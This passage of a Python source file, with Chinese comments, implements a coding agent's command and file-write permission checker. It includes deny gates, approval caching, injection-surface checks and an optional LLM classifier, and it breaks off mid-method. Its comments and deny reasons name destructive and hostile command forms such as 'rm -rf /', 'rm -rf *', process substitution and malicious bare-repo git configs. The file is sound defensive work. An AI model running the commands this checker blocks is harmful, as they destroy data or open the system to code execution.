        if not toks:
            continue
        verb = toks[0].replace("\\", "/").split("/")[-1].lower()
        if verb not in _REMOVAL_VERBS:
            continue
        for tok in toks[1:]:
            if _CMD_FLAG_RE.match(tok):
                continue
            t = tok.strip("'\"")
            if not t:
                continue
            if t == "*":
                return f"危险删除目标（通配符 *）: {seg.strip()}"
            try:
                p = Path(t).expanduser()
                resolved = p if p.is_absolute() else (Path(base_dir) / p)
                rp = str(Path(str(resolved)).resolve())
            except (OSError, ValueError, RuntimeError):
                continue  # 解析失败的 token 不硬拦,交给其他闸门处理
            if is_dangerous_removal_path(rp):
                return f"危险删除目标: {rp}"
    return None


# ---------------------------------------------------------------------------
# 完整命令权限检查器(带审批缓存)——权限系统的主入口类
# ---------------------------------------------------------------------------

class PermissionChecker:
    """命令执行权限检查器:每条命令执行前都来问它。

    大白话:它就是那个"保安亭"。命令进来,按顺序过一道道关卡
    (详见模块头):闸门 0 底线 → 内容级规则 → 危险删除 → acceptEdits
    放行 → 闸门 1 硬拒绝黑名单 → 注入面 → 只读快速通道 → 闸门 2 破坏性
    审批 → 闸门 4 副分类 → 闸门 3 默认通过。

    两级缓存免得反复打扰用户:
    - 持久化白名单:用户批准过的破坏性命令存成 JSON 文件,跨会话不再问;
    - 会话内缓存 _approved:本次会话批过的命令不重复问(新会话重置,
      避免长期信任漂移)。
    """

    def __init__(
        self,
        approval_callback: Optional[Callable[[str], bool]] = None,
        whitelist_file=None,
        paths_whitelist_file=None,
        mode: str = "default",  # "default" | "bypassPermissions" | "acceptEdits" | "autoDeny"
        hooks_registry=None,  # 权限审计 hook
    ):
        """
        参数：
            approval_callback: 审批函数 fn(command: str) -> bool——破坏性命令或
                              路径审批时弹出来问用户。callback 内部按字符串
                              内容区分是命令还是路径(含 / 或 \\ 或 ~ 开头的是
                              路径)。返回值除了 True/False 还可以是 "always"
                              (总是允许,见 check_path)。
            whitelist_file: 持久化命令白名单的 JSON 文件路径
                            (如 ~/.codeAgent/approved_commands.json)。
            paths_whitelist_file: 路径白名单 JSON(如 ~/.codeAgent/approved_paths.json)
                                  ——用户批准过的写入路径,跨会话不再问。
            mode: 权限模式,四种:
                  - "default": 四道闸门全开(黑名单 + 破坏性审批 + 默认通过
                    + 可选的 LLM 分类)。
                  - "bypassPermissions": 跳过闸门 1/2/3/4,直接放行所有命令;
                    但闸门 0(自我保护 + fatal 硬底线)仍然生效。
                    用于显式跳过全部权限确认的场景。
                  - "acceptEdits": 工作目录内的文件操作命令(mkdir/touch/mv/cp/
                    rm/del)和工作目录内写入自动放行,其他命令走原闸门(fatal
                    底线 + 自我保护 + 受保护路径仍然生效)。适合 AI 连续编辑
                    代码的场景。
                  - "autoDeny": 所有需要用户审批的命令直接拒
                    (fail-closed,出错就拒绝而不是放行)。用于 async 子代理
                    (主对话派出去的后台分身):用户不在场没法弹审批。
                    保留 fatal 底线 + 黑名单 + 受保护路径(所有硬拒仍生效);
                    已批准命令(白名单缓存)仍可执行;
                    其他破坏性命令(rm 等)一律 permission_denied。
            hooks_registry: 可选的 HookRegistry,用来触发 PERMISSION_REQUEST /
                           PERMISSION_DENIED 审计事件。fail-open:hook 出异常
                           不影响权限判断本身。
        """
        self.approval_callback = approval_callback
        # 保护白名单的读改写的锁(全局共享的 checker 会被
        # 主线程审批和 async 子代理线程同时用;用 RLock 是因为 _save_whitelist
        # 会在锁内被再次调用)
        self._wl_lock = threading.RLock()
        self._approved = set()  # 会话内缓存(批过的命令)
        # 会话级"写入根目录"审批缓存(check_path 里白名单外的
        # 写入,用户批一次,其父目录进缓存,同目录后续写入不再问)
        self._approved_write_roots: set = set()
        self._whitelist_file = whitelist_file
        self._persistent_whitelist = set()
        self._persistent_prefixes: set = set()  # 前缀规则(从 curated 表派生)
        if whitelist_file:
            self._load_whitelist()
        # 路径白名单(write_file 等场景,用户批准过的写入路径)
        self._paths_whitelist_file = paths_whitelist_file
        self._approved_paths = set()
        if paths_whitelist_file:
            self._load_paths_whitelist()
        # 权限模式(default / bypassPermissions / acceptEdits / autoDeny)
        if mode not in ("default", "bypassPermissions", "acceptEdits", "autoDeny"):
            raise ValueError(f"非法 permission_mode: {mode}")
        self.mode = mode
        # hooks registry 引用(可选,None 就不触发审计 hook)
        self._hooks_registry = hooks_registry
        # OS 沙箱模式(off | on);运行时用 set_sandbox_mode() 切换。
        # 真正把沙箱 wrapper 包到命令上的是 terminal_tool(它读这个字段
        # 决定走哪条路)
        self.sandbox_mode = "off"
        # === 闸门 4 的注入点(aux_llm + config)===
        # 为什么用 provider(延迟取值函数)而不是直接传对象:PermissionChecker
        # 在 cli.py 里比 aux_llm_router 先构造,拿不到现成实例(和 hook_exec
        # 的 _AUX_ROUTER_PROVIDER 同一个套路)。默认 None:闸门 4 完全跳过
        # (向后兼容,默认关)。
        self._aux_llm_provider: Optional[Callable[[], Any]] = None
        self._config_provider: Optional[Callable[[], Dict[str, Any]]] = None
        # 闸门 4 的拒绝计数(连续 + 累计,达到阈值就停用闸门 4
        # 回落人工审批)
        self._llm_denial_consecutive = 0
        self._llm_denial_total = 0

    def set_aux_llm_provider(self, provider: Callable[[], Any]) -> None:
        """注入副 LLM 路由的 provider(cli.py 创建好 aux_llm_router 后调用)。

        provider 是个函数,调用它返回 AuxLLMRouter 实例或 None。
        为什么用 provider 而不直接传 router:PermissionChecker 比
        aux_llm_router 先构造,当时还没有实例(和 hook_exec 的
        set_aux_router_provider 同一个套路)。

        参数:
            provider: 无参函数,返回 AuxLLMRouter 实例或 None。
        """
        self._aux_llm_provider = provider

    def set_config_provider(self, provider: Callable[[], Dict[str, Any]]) -> None:
        """注入 config provider(cli.py 在 RuntimeContext 组装完后调用)。

        provider 是个函数,返回 config 字典或 None。
        为什么需要:闸门 4 要读 config.features.bash_llm_classifier 判断
        开关状态和白名单。

        参数:
            provider: 无参函数,返回 config dict 或 None。
        """
        self._config_provider = provider

    def _readonly_fastpath_enabled(self) -> bool:
        """只读快速通道的开关(config security.readonly_fastpath_enabled,默认开)。

        返回:True 表示启用。读不到配置时也返回 True(fail-open,
        读不到配置就按默认值来,别把功能弄没了)。
        """
        if self._config_provider is None:
            return True
        try:
            config = self._config_provider() or {}
            sec = config.get("security") or {}
            return bool(sec.get("readonly_fastpath_enabled", True))
        except Exception:
            return True  # fail-open:读不到配置默认开

    def _deny(self, command: str, reason: str, deny_type: str = "deny") -> "PermissionResult":
        """统一的拒绝 helper。

        干什么:所有"拒绝"都从这儿出——先触发 PERMISSION_DENIED 审计 hook
        (hook 出错不影响拒绝本身,fail-open),再返回 PermissionResult(False)。

        为什么统一走它:保证审计事件不会漏(哪个关卡拒的都有记录可查)。

        参数:
            command: 被拒的命令(或路径字符串)。
            reason: 拒绝原因。
            deny_type: 拒绝类型标签(如 "deny"/"protected"/"auto_deny")。
        """
        if self._hooks_registry is not None:
            try:
                self._hooks_registry.run_permission_denied({
                    "command": command,
                    "reason": reason,
                    "deny_type": deny_type,
                })
            except Exception:
                pass  # fail-open:hook 出异常不影响权限判断本身
        return PermissionResult(False, reason, deny_type)

    def _load_whitelist(self):
        """从 JSON 文件加载持久化命令白名单(含前缀规则);读失败只记 debug 日志不崩。"""
        if not self._whitelist_file:
            return
        try:
            path = Path(self._whitelist_file)
            if path.exists():
                data = json.loads(path.read_text(encoding="utf-8"))
                self._persistent_whitelist = set(data.get("commands", []))
                # 前缀规则(旧格式文件没这个键 → 读成空集,向后兼容)
                self._persistent_prefixes = set(data.get("prefixes", []))
                logger.info("加载 %d 条已批准命令", len(self._persistent_whitelist))
        except Exception as e:
            logger.debug("加载白名单失败: %s", e)

    def _save_whitelist(self):
        """把持久化白名单写回 JSON 文件（原子写；快照+写盘整段加锁）。

        只锁"拍快照"那一下不够——rename 的落盘时机可能
        晚于别人更早的快照。场景：线程 T 拍了快照慢慢写盘，线程 Y 这时
        加了条目并先落盘，T 的旧快照随后落盘把 Y 的更新覆盖 → Y 白加了。
        所以要把"快照到 rename"整段锁住，让所有 save 排成全序，
        后写者的快照必然包含前序 add 的全部内容。
        """
        if not self._whitelist_file:
            return
        try:
            with self._wl_lock:
                payload = json.dumps(
                    {
                        "commands": sorted(self._persistent_whitelist),
                        "prefixes": sorted(self._persistent_prefixes),
                    },
                    ensure_ascii=False,
                    indent=2,
                )
                atomic_write_text(Path(self._whitelist_file), payload)
        except Exception as e:
            logger.debug("保存白名单失败: %s", e)

    def _load_paths_whitelist(self):
        """从 JSON 文件加载路径白名单(用户批过的写入路径);读失败只记 debug 日志。"""
        if not self._paths_whitelist_file:
            return
        try:
            path = Path(self._paths_whitelist_file)
            if path.exists():
                data = json.loads(path.read_text(encoding="utf-8"))
                self._approved_paths = set(data.get("paths", []))
                logger.info("加载 %d 条已批准写入路径", len(self._approved_paths))
        except Exception as e:
            logger.debug("加载路径白名单失败: %s", e)

    def _save_paths_whitelist(self):
        """把路径白名单写回 JSON 文件(原子写;写失败只记 debug 日志)。"""
        if not self._paths_whitelist_file:
            return
        try:
            path = Path(self._paths_whitelist_file)
            atomic_write_text(
                path,
                json.dumps(
                    {"paths": sorted(self._approved_paths)},
                    ensure_ascii=False,
                    indent=2,
                ),
            )
        except Exception as e:
            logger.debug("保存路径白名单失败: %s", e)

    def _approval_gate(
        self,
        command: str,
        effective_mode: str,
        *,
        hook_reason: str,
        auto_deny_reason: str,
        no_callback_message: str,
        gate: str,
    ) -> PermissionResult:
        """统一审批闸门(公共函数;破坏性命令和注入面形态共用)。

        干什么:所有"要问用户"的场景都走这一套流程:
        持久化白名单/会话缓存命中 → 直接放行;
        autoDeny 模式 → 短路拒绝(async 子代理不能弹审批窗口);
        没配审批 callback → 拒;
        然后触发 PERMISSION_REQUEST 审计 hook + 桌面 toast 通知;
        调 callback 问用户 → 拒绝就拒,批准就进会话缓存 + 持久化白名单
        (还会试着派生前缀规则)。

        参数：
            command: 待审批的命令。
            effective_mode: 本次生效的权限模式(autoDeny 判断要用)。
            hook_reason: 审计 hook 里记的审批原因。
            auto_deny_reason: autoDeny 拒绝时给的原因。
            no_callback_message: 没配 callback 时的拒绝消息。
            gate: 结果里的关卡标签(如 "destructive"/"injection")。

        返回:PermissionResult。
        """
        cmd_key = command.strip()

        # 先查持久化白名单和会话缓存(批过就放)
        if cmd_key in self._persistent_whitelist or cmd_key in self._approved:
            return PermissionResult(True, "已批准（白名单）", "approval")

        # 前缀规则命中(词边界:cmd == p 或 cmd 以 "p " 开头)。
        # 带复合操作符/重定向的命令不走前缀免审(防前半段匹配掩护后半段)
        from agent.command_prefix import is_prefix_match_safe
        if is_prefix_match_safe(cmd_key):
            for p in self._persistent_prefixes:
                if cmd_key == p or cmd_key.startswith(p + " "):
                    return PermissionResult(True, "已批准（前缀规则）", "approval")

        # autoDeny 短路(fail-closed,直接拒):
        # - fatal 底线(rm -rf / 等)在闸门 0 已经拒了,走不到这里
        # - 黑名单(sudo 等)在闸门 1 已经拒了,走不到这里
        # - 必须用 effective_mode——全局共享的那个 checker
        #   (get_default_checker() 返回的实例)的 self.mode 永远是 "default",
        #   子代理的 autoDeny 是通过 mode_override 传进来的,只有
        #   effective_mode 能反映真实模式。
        if effective_mode == "autoDeny":
            return self._deny(
                command,
                f"auto-denied: async 子代理不能弹审批 UI（{auto_deny_reason}）",
                "auto_deny",
            )

        if self.approval_callback is None:
            return self._deny(command, no_callback_message, gate)

        # PERMISSION_REQUEST 审计(弹窗问用户之前记一笔;hook 出错不影响)
        if self._hooks_registry is not None:
            try:
                self._hooks_registry.run_permission_request({
                    "command": command,
                    "reason": hook_reason,
                })
            except Exception:
                pass  # fail-open:hook 出错不影响审批流程

        # 桌面通知——用户可能没盯着屏幕,弹个 toast 提醒有审批在等(失败不拦)
        try:
            from agent.notifier import notify as _notify
            _notify("需要审批", "agent 请求执行命令")
        except Exception:
            pass

        try:
            approved = bool(self.approval_callback(command))
        except Exception:
            approved = False

        if not approved:
            return self._deny(command, "用户拒绝", "approval")

        # 用户批了:进会话缓存 + 持久化白名单(整段加锁,防并发审批下
        # 前缀/命令交错写入造成不一致)
        with self._wl_lock:
            self._approved.add(cmd_key)
            self._persistent_whitelist.add(cmd_key)
            # curated 表里可泛化的命令 → 额外存一条前缀规则
            # (同类跑测试的命令下次不再问)
            from agent.command_prefix import derive_approved_prefix
            try:
                prefix = derive_approved_prefix(cmd_key)
            except Exception:
                prefix = None
            if prefix and prefix not in self._persistent_prefixes:
                self._persistent_prefixes.add(prefix)
                logger.info("已存前缀规则: %s（同前缀命令不再询问）", prefix)
        self._save_whitelist()
        return PermissionResult(True, "已批准", "approval")

    def check(
        self,
        command: str,
        cwd: Optional[str] = None,
        *,
        mode_override: Optional[str] = None,
    ) -> PermissionResult:
        """检查一条命令是否允许执行——整个权限系统的主入口。

        干什么:按顺序过完模块头说的那串关卡,给出放行/拒绝/需审批的结论。

        参数：
            command: 待检查的 shell 命令。
            cwd: 当前工作目录(自我保护检查要用;不传由各检查自定默认)。
            mode_override: 可选的模式覆盖("default"/"bypassPermissions"/
                          "acceptEdits"/"autoDeny"),优先于 self.mode。
                          为什么需要:子代理(分身)按自己定义里的权限模式
                          做决策时,不能去改全局共享 checker 的 self.mode
                          (那会影响别的线程,不安全),所以每次调用临时传。

        返回:PermissionResult(allowed/reason/gate)。
        """
        # 本次 check 用哪个模式(override 优先)
        effective_mode = mode_override or self.mode

        # 闸门 0:绕不过去的底线(自我保护 + 系统级 fatal)
        # 这两道检查在任何模式下(包括 bypassPermissions)都执行
        self_violation = check_self_modification(command, cwd)
        if self_violation:
            return self._deny(command, f"自我保护: {self_violation}", "deny")
        fatal = check_fatal_irreversible(command)
        if fatal:
            return self._deny(command, f"硬底线: {fatal}", "deny")

        # === 内容级权限规则(Bash(cmd:*) 写法,优先级 deny > ask > allow)===
        # deny:任何模式都拒(含 bypass——用户显式 deny 是最高意图)
        # ask:强制审批(bypass 也不豁免)
        # allow:标记 content_allowed,后面跳过注入面/破坏性审批
        #        (硬底线已在闸门 0 拒掉;黑名单/危险删除在后面仍然生效)
        from agent.tool_permissions import check_command_rules
        content_rule = check_command_rules(command)
        if content_rule == "deny":
            return self._deny(command, "内容级规则拒绝（permissions.deny）", "rule_deny")
        if content_rule == "ask":
            return self._approval_gate(
                command,
                effective_mode,
                hook_reason="内容级规则要求审批（permissions.ask）",
                auto_deny_reason="内容级规则要求审批（permissions.ask）",
                no_callback_message="内容级规则要求审批（permissions.ask）",
                gate="rule_ask",
            )
        content_allowed = content_rule == "allow"

        # bypassPermissions 模式:跳过闸门 1/2/3,剩下所有命令直接放行
        # 适用场景:用户显式接受全部风险、不需要审批。
        # 闸门 0 的两道底线仍生效。
        # (内容级 deny/ask 上面已经先处理了——bypass 不豁免它们)
        if effective_mode == "bypassPermissions":
            return PermissionResult(True, "bypassPermissions 模式放行", "bypass")

        # === 危险删除路径(任何非 bypass 模式默认拒,审批也解不了锁)===
        # rm/del 的目标是 * / 根 / 家 / 根直接子目录 / 盘根(直接子目录) → 拒。
        # 为什么必须排在 acceptEdits 之前:rm 在 SAFE_FS 动词表里,
        # 不先查的话 "rm -rf *" 会被"cwd 内文件操作自动放行"给放过去。
        dangerous_rm = check_dangerous_removal(command, cwd)
        if dangerous_rm:
            return self._deny(command, f"危险删除: {dangerous_rm}", "deny")

        # acceptEdits: cwd 内的文件操作命令自动放行;其他命令走原闸门
        if effective_mode == "acceptEdits" and _is_safe_fs_in_cwd(command, cwd):
            return PermissionResult(True, "acceptEdits: safe-fs in cwd", "auto")

        # 闸门 1:硬拒绝(黑名单)
        deny = check_command_deny(command)
        if deny:
            return self._deny(command, f"硬拒绝: {deny}", "deny")

        # === 内容级 allow 命中 → 放行(硬底线/黑名单前面已拒掉)===
        if content_allowed:
            return PermissionResult(True, "内容级规则允许（permissions.allow）", "rule_allow")

        # === 注入面形态(命中 → 升审批,不是硬拒)===
        # $()/${}/进程替换/zsh 展开/IFS/控制字符等"所见非所执行"的形态——
        # 你看到的命令字符串和 shell 实际执行的东西可能不一样。
        # 语义:所见非所执行 ≠ 攻击,所以问而不是拒。
        # 为什么必须排在只读快速通道之前:ls <(evil) 不能被只读通道自动放行。
        injection = check_injection_surface(command)
        if injection:
            return self._approval_gate(
                command,
                effective_mode,
                hook_reason=f"注入面: {injection}",
                auto_deny_reason=f"注入面: {injection}",
                no_callback_message=f"命令含注入面形态需用户确认: {injection}",
                gate="injection",
            )

        # === 复合命令段数上限(防 DoS)===
        # 超长的复合命令不进任何解析路径,直接升审批
        if len(_CMD_SEGMENT_SPLIT_RE.split(command)) > _MAX_COMPOUND_SEGMENTS:
            return self._approval_gate(
                command,
                effective_mode,
                hook_reason="复合命令段数超上限（>50），疑似 DoS/异常生成",
                auto_deny_reason="复合命令段数超上限（>50）",
                no_callback_message="复合命令段数超上限（>50），需用户确认",
                gate="too_many_segments",
            )

        # === cd+git 组合(防恶意裸仓库远程执行代码)===
        if _has_cd_git_combo(command):
            return self._approval_gate(
                command,
                effective_mode,
                hook_reason="cd 后跟 git（bare-repo core.fsmonitor RCE 防护）",
                auto_deny_reason="cd+git 组合需确认（bare-repo 攻击面）",
                no_callback_message="cd 到目录后再跑 git 需用户确认（防恶意 repo 配置注入）",
                gate="cd_git",
            )

        # === 只读快速通道(自动批,排在破坏性审批和 LLM 分类器之前)===
        # git status/ls/cat 这些只读命令零打扰放行(也跳过闸门 4 的 LLM 调用)。
        # 为什么排在闸门 1 之后:黑名单永远比快速通道先判(fatal 底线更早在闸门 0)。
        # config 里 security.readonly_fastpath_enabled=False 可关(默认开)。
        if self._readonly_fastpath_enabled():
            if is_readonly_command(command):
                return PermissionResult(True, "只读快速通道（readonly fastpath）", "auto")

        # 闸门 2:破坏性命令(要审批;和注入面共用 _approval_gate)
        destructive = check_destructive(command)
        if destructive:
            return self._approval_gate(
                command,
                effective_mode,
                hook_reason=destructive,
                auto_deny_reason=f"破坏性命令: {destructive}",
                no_callback_message=f"破坏性命令需用户确认: {destructive}",
                gate="destructive",
            )

        # 闸门 4:副 LLM 分类(feature flag 控制开关,默认关)
        # 走到这里说明前三道闸门都没拒绝也没要求审批(非黑名单、非破坏性),
        # 让副 LLM 从语义上再判一次。白名单命令跳过 LLM 调用。
        # fail-open:feature 关着 / 没注入 provider / LLM 调用失败 → 放行。
        result = self._check_llm_classifier(command, effective_mode)
        if result is not None:
            return result

        # 闸门 3:默认通过
        return PermissionResult(True, "ok", "ok")

    def _check_llm_classifier(
        self, command: str, effective_mode: str
    ) -> Optional[PermissionResult]:
        """闸门 4 的实现:调副 LLM 给命令做安全分类。

        分类结果三向(allow 放行/deny 拒绝/ask 升人工审批——
        拿不准问人,不直接拒);settings.json permissions.nl_rules 里的
        自然语言规则会拼进分类提示词。

        参数:
            command: 要分类的命令。
            effective_mode: 本次 check 的生效权限模式(ask 分支调
                _approval_gate 要用——autoDeny 短路、全局共享 checker 的
                线程安全语义都靠它)。

        返回:
            PermissionResult:放行/拒绝/审批的结论;
            None:闸门 4 没启用,或 fail-open 放行(交给闸门 3 默认通过,
            向后兼容老行为)。
        """
        # 1) provider 没注入(默认 None)→ 闸门 4 整个跳过
        if self._config_provider is None or self._aux_llm_provider is None:
            return None

        # 拒绝回落:连续 3 次或累计 20 次判 unsafe → 本会话停用
        # 闸门 4(分类器明显和用户意图不合拍了,回落人工审批比反复误拒强)
        if (self._llm_denial_consecutive >= LLM_DENIAL_MAX_CONSECUTIVE
                or self._llm_denial_total >= LLM_DENIAL_MAX_TOTAL):
            return None

        # 2) 读 config,看 feature flag 开没开
        try:
            config = self._config_provider() or {}
        except Exception as e:
            logger.warning("bash_llm_classifier: config provider 异常（跳过）: %s", e)
            return None

        try:
            from agent.feature_flags import is_feature_enabled, get_feature_config
        except ImportError:
            return None

        if not is_feature_enabled(config, "bash_llm_classifier"):
            return None  # feature 关着 → 跳过

        # 3) 白名单快速通道(0 次 LLM 调用)
        # 危险前缀剥离:解释器/runner/eval 类的白名单条目会让
        # 分类器形同虚设(python -c 能执行任意代码),这类条目不给开快速通道
        # (不改用户的 config,只在闸门 4 内忽略——命令仍走正常分类)。
        cfg = get_feature_config(config, "bash_llm_classifier")
        raw_whitelist = cfg.get("whitelist", [])
        whitelist = [
            w for w in raw_whitelist
            if not _is_dangerous_whitelist_entry(str(w))
        ]
        if _matches_whitelist(command, whitelist):
            return PermissionResult(True, "白名单快速通道", "whitelist")

        # 4) 调副 LLM 分类(async 接口 → 交常驻循环宿主桥接到同步)
        try:
            aux_llm = self._aux_llm_provider()
        except Exception as e:
            logger.warning("bash_llm_classifier: aux_llm provider 异常（fail-open）: %s", e)
            return None  # fail-open:交给闸门 3 放行

        if aux_llm is None:
            # provider 返回 None(副 LLM 没配置)→ fail-open
            return None

        # nl_rules 注入(settings.json permissions.nl_rules 里的
        # 自然语言规则,如"不允许动 docker")
        try:
            nl_rules = (config.get("permissions") or {}).get("nl_rules") or []
            aux_llm.nl_rules_cache = [str(r) for r in nl_rules]
        except Exception:
            aux_llm.nl_rules_cache = []

        # 惰性导入:进程级常驻循环宿主(延迟导入防模块互相 import 死锁)
        from agent.loop_host import loop_host

        # 预判式防御：先看自己在不在某个运行中的事件循环线程里——
        # 在的话分两种：是宿主循环线程，走最前面的 fail-open（自己等自己
        # 无解，宁可跳过分类也绝不死锁）；是其他循环线程，才转 1-worker
        # 线程池阻塞等（保住 check() 的同步契约）；不在（同步工具线程的
        # 常态），直接 run_async 快路径。
        try:
            _running_loop = asyncio.get_running_loop()
        except RuntimeError:
            _running_loop = None
        try:
            if _running_loop is not None:
                # 宿主循环线程是唯一无解的场景：worker 里的 run_async 等宿主
                # 循环跑协程、宿主循环线程又在 join 等 worker——结构性死锁。
                # 同步契约下无阻塞解；当前调用方（to_thread worker）不会落到
                # 这里。真落进来就大声 fail-open 跳过分类，绝不死锁。
                if loop_host.loop is not None and _running_loop is loop_host.loop:
                    logger.error(
                        "bash_llm_classifier: 在宿主循环线程被同步调用"
                        "（契约禁止——fail-open 跳过分类，绝不死锁）",
                    )
                    return None
                from concurrent.futures import ThreadPoolExecutor
                with ThreadPoolExecutor(max_workers=1) as _ex:
                    verdict = _ex.submit(
                        loop_host.run_async,
                        _classify_bash_command(command, aux_llm),
                    ).result()
            else:
                verdict = loop_host.run_async(
                    _classify_bash_command(command, aux_llm),
                )
        except Exception as e:
            logger.warning("bash_llm_classifier: 分类调用异常（fail-open）: %s", e)
            return None

        # 调用失败 → fail-open 放行(交给闸门 3 默认通过)
        if "error" in verdict:
            return None

        # 三向结果分发(allow 放行 / ask 升审批 / deny 拒绝)
        v = verdict.get("verdict")
        if v == "allow":
            self._llm_denial_consecutive = 0
            return PermissionResult(True, "aux_llm 判允许", "llm_safe")
        if v == "ask":
            # 拿不准 → 升人工审批(不直接拒)
            return self._approval_gate(
                command,
                effective_mode,
                hook_reason=f"LLM 分类器要求审批: {verdict.get('reason', '')}",
                auto_deny_reason=f"LLM 分类器要求审批: {verdict.get('reason', '')}",
                no_callback_message="LLM 分类器要求审批（无审批 callback）",
                gate="llm_ask",
            )

        # AI 判 deny → 拒绝并给原因
        # 拒绝计数(连续 +1,累计 +1;到阈值停用闸门 4)
        self._llm_denial_consecutive += 1
        self._llm_denial_total += 1
        if (self._llm_denial_consecutive >= LLM_DENIAL_MAX_CONSECUTIVE
                or self._llm_denial_total >= LLM_DENIAL_MAX_TOTAL):
            logger.warning(
                "bash_llm_classifier 拒绝回落（连续 %d/累计 %d 次），本会话停用闸门 4",
                self._llm_denial_consecutive, self._llm_denial_total,
            )
        reason = verdict.get("reason", "AI 判定不安全")
        return self._deny(
            command,
            f"AI 分类拒绝: {reason}",
            "llm_unsafe",
        )

    def check_path(
        self,
        path,
        *,
        write: bool = False,
        allowed_roots: Optional[List] = None,
        mode_override: Optional[str] = None,
    ) -> PermissionResult:
        """检查一个文件路径是否允许访问(写文件工具走这里,带审批;函数版是 safe_path)。

        规则(大白话):
        - 读:碰到受保护路径(~/.ssh 这些)就拒,其他随便读;
        - 写,三道关卡:
          闸门 1:受保护路径(~/.ssh / /etc / C:\\Windows 等)→ 硬拒(安全底线);
          闸门 2:写保护路径(CodeAgent 项目代码目录)→ 硬拒(防 AI 改自己);
          闸门 3:写白名单(工作目录 / ~/.codeAgent / /add-dir 追加的目录)
                 之内放行;之外走审批通道:
                 会话缓存命中放行 → autoDeny 直接拒 → approval_callback
                 弹窗问用户(批了以后父目录进会话缓存,同目录不再问) →
                 没配 callback 就拒。

        闸门 3 的白名单必须统一从
        default_allowed_roots() 取(工作目录 + ~/.codeAgent
        + _EXTRA_ALLOWED_ROOTS,和 safe_path 同一个来源)——write_file/
        str_replace 走的是 check_path 而不是 safe_path,白名单语义放开成
        "其他全通过"会让 /add-dir 加的额外目录对它们不生效。
        顺序铁律:闸门 1/2 排在前——就算往白名单里加了整个家目录,
        ~/.ssh 也照样写不了。

        参数：
            path: 待检查的路径。
            write: 是否写操作(默认 False)。
            allowed_roots: 允许写入的根目录;不传用默认白名单。
            mode_override: 可选的模式覆盖(语义同 check)。bypassPermissions
                          时跳过写保护(项目代码)之外的写约束
                          (is_protected_path 硬底线仍生效)。

        返回:PermissionResult。
        """
        # 本次 check_path 用哪个模式(override 优先)
        effective_mode = mode_override or self.mode

        # 可疑路径形态先查(读写都查、任何模式都拒——安全底线,
        # 防止 NTFS ADS / 8.3 短名 / 尾点这些花招绕过下面的保护表和白名单)
        susp = check_suspicious_path(path, write=write)
        if susp:
            return self._deny(str(path), f"可疑路径形态: {susp}", "suspicious")

        # 闸门 1:受保护路径硬拒(任何模式下都拒——安全底线)
        prot = is_protected_path(path)
        if prot:
            return self._deny(str(path), f"受保护路径: {prot}", "protected")

        if not write:
            return PermissionResult(True, "ok", "ok")

        # 闸门 2:写保护路径(项目代码目录)→ 拒
        # bypassPermissions 模式下也保留这道检查(防 AI 改自身源码)。
        # 这个块必须排在 acceptEdits 分支前面——
        # 闸门 2 是全模式硬底线,acceptEdits 不能绕过
        # (否则工作目录恰好是 AI 自己的代码库时,"cwd 内自动放行"会把它
        # 自己的源码也一起批出去)。
        wprot = is_write_protected_path(path)
        if wprot:
            return self._deny(str(path), f"写保护(项目代码): {wprot}", "protected")

        # acceptEdits: 工作目录内的写入自动放行
        # (受保护路径闸门 1 已拒、写保护闸门 2 已拒,
        # 这里只处理工作目录内的正常写入)
        if effective_mode == "acceptEdits":
            from agent.workspace_context import get_workspace_cwd
            try:
                cwd_path = Path(get_workspace_cwd()).resolve()
                resolved = Path(path).expanduser().resolve()
                resolved.relative_to(cwd_path)
                return PermissionResult(True, "acceptEdits: write in cwd", "auto")
            except (ValueError, OSError, RuntimeError):
                pass  # 在工作目录外 → 继续走下面的白名单检查

        # 闸门 3:写白名单。
        # bypassPermissions 跳过白名单(闸门 1/2 硬底线在上面已守住;
        # 和 test_write_file_respects_agent_ref_bypass_mode 的既有语义对齐)。
        if effective_mode == "bypassPermissions":
            return PermissionResult(True, "ok", "ok")

        # 白名单和 safe_path 同一个来源:工作目录 + ~/.codeAgent + 额外目录。
        # 调用方显式传了 allowed_roots 就以其为准(覆盖默认)。
        if allowed_roots is None:
            allowed_roots = default_allowed_roots()
        roots = [Path(p).expanduser().resolve() for p in allowed_roots]

        try:
            resolved = Path(path).expanduser().resolve()
        except (OSError, ValueError) as e:
            return self._deny(str(path), f"路径解析失败: {e}", "protected")

        for root in roots:
            try:
                resolved.relative_to(root)
                return PermissionResult(True, "白名单内", "ok")
            except (OSError, ValueError):
                continue

        # === 闸门 3 的审批通道(白名单外、最终拒绝之前)===
        # 和 terminal 命令审批同一套:会话缓存 → autoDeny 短路 → callback 问用户。
        # 注意:闸门 1/2(受保护/写保护)在上面已经硬拒,走不到这里——
        # 追加白名单/审批缓存都绕不过硬底线(安全默认优先,事后补救就晚了)。

        # 3.1 会话缓存命中:目标路径在已批准的写入根目录下 → 放行
        # (relative_to 对路径相等也成立,批准的目录本身命中同样放行)
        # 迭代的是副本:主线程审批 .add() 和 async 子代理的后台线程并发
        # 迭代同一个 set 会抛 "Set changed size during iteration"
        for approved_root in tuple(self._approved_write_roots):
            try:
                resolved.relative_to(approved_root)
                return PermissionResult(True, "已批准（写入根目录）", "approval")
            except (OSError, ValueError):
                continue

        # 3.2 autoDeny:async 子代理(用户不在场)没法弹审批窗口 → 直接拒
        # (和 terminal 闸门 3 的 autoDeny 短路语义对齐,fail-closed)
        if effective_mode == "autoDeny":
            return self._deny(
                str(path),
                f"auto-denied: async 子代理不能弹审批 UI（白名单外写入: {resolved}）",
                "auto_deny",
            )

        # 3.3 default / acceptEdits(工作目录外落到这里):有 callback → 问用户
        # callback 签名 fn(item: str) -> bool(和 terminal 共用同一个接口),
        # 靠消息文本前缀"文件写入审批"区分类型(cli.py 的 callback 按内容
        # 是否含路径分隔符来识别是路径审批)。
        if self.approval_callback is not None:
            # PERMISSION_REQUEST 审计 + toast 通知
            # (和 terminal 的审批点同一套);hook/notify 出异常不影响审批流程
            if self._hooks_registry is not None:
                try:
                    self._hooks_registry.run_permission_request({
                        "command": f"文件写入审批: {resolved}",
                        "reason": f"写入路径不在白名单: {resolved}",
                    })
                except Exception:
                    pass  # fail-open

            try:
                from agent.notifier import notify as _notify
                _notify("需要审批", "agent 请求写入白名单外路径（可选总是允许）")
            except Exception:
                pass

            try:
                decision = self.approval_callback(f"文件写入审批: {resolved}")
            except Exception:
                decision = False  # fail-open:callback 出异常按拒绝处理(别崩)

            # "总是允许"档——持久化到 settings.json。
            # 协议向后兼容:返回 True 视为"本次允许"(只进会话缓存,老语义)。
            if decision == "always":
                parent = resolved.parent
                # 会话缓存 + 运行时白名单(本进程内立即生效,对其他 checker
                # 实例也生效)
                with self._wl_lock:  # 并发审批一致性
                    self._approved_write_roots.add(parent)
                try:
